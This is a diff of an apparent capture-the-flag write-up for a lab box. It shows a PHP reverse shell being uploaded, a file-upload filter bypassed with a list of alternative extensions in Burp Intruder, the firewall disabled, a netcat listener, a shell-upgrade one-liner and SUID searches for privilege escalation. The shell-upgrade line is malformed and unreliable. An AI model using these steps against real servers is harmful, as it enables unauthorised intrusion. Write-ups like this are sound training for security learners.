@@ -41,16 +41,91 @@ Here, I decided to brute-force the directory using the wfuzz tool. I guess that'
  
  <img src="/assets/img/root-me/wfuzz.png" width="450"/>
  
- There are two directories on the website. One is the panel directory and uploads directories.
+ There are two directories on the website. One is the panel directory and uploads directory.
 
 <p align="left">
-<img src="/assets/img/root-me/home-page.png" width="450"/> 
+<img src="/assets/img/root-me/panel.png" width="450"/> 
+</p>
+
+In the panel directory, upload the PHP reverse shell.
+  
+Download the php shell in https://github.com/pentestmonkey/php-reverse-shell.
+ 
+Edit the code with leafpad editor.
+ 
+In php code, change ip and port no.(preferable).
+ 
+ <p align="left">
+<img src="/assets/img/root-me/
+shellediting.png " width="450"/> 
 </p>
   
-  Upload the PHP reverse shell to the panel directory.
-  
+  It is not possible to upload a .php file.
+
+<p align="left">
+<img src="/assets/img/root-me/
+shellediting.png " width="450"/> 
+</p>
+
+So, Here to bypass file upload.
+
+Burpsuite request intercepted and sent to intruder.
+
+ <p align="left">
+<img src="/assets/img/root-me/
+shellediting.png " width="450"/> 
+</p>
+
+Select the payload position and payloads tab add payloads.
+ 
+ <p align="left">
+<img src="/assets/img/root-me/
+shellediting.png " width="450"/> 
+</p>
+
+File Upload Bypass:
+
+Php : .php,.php2,.php3,.php4,.php5,.php6,.php7,.phps,.pht,.phtml,.pgif,.shtml,.htaccess,.phar,.inc
+ 
+Asp: .asp,aspx,.config,.ashx,.aspq,.axd,.cshtm,cshtml,.rem,.soap,.vbhtml,.vbhtml,.asa,.cer,.shtml
+
+After the add payloads,click start attack.
+
+ <p align="left">
+<img src="/assets/img/root-me/
+shellediting.png " width="450"/> 
+</p>
+
+After file upload successfully.
+
 Disable the ufw firewall.
 
   > sudo ufw disable
+
+Run the nc (netcat).
+
+> nc -lvnp 33456
+
+and click the uploaded shell.
+
+Got it .
+
+Better shell for 
+
+   python3 -c 'pty;pty.spawn('/bin/bash')'
+
+find the user.txt file 
+
+find / -type f -iname "user.txt" 2>/dev/null
+
+Now to privilege escalation
+
+
+Search for files with SUID permission,
+
+find / -user root -perm -4000 2>/dev/null
+
+
+
 
 
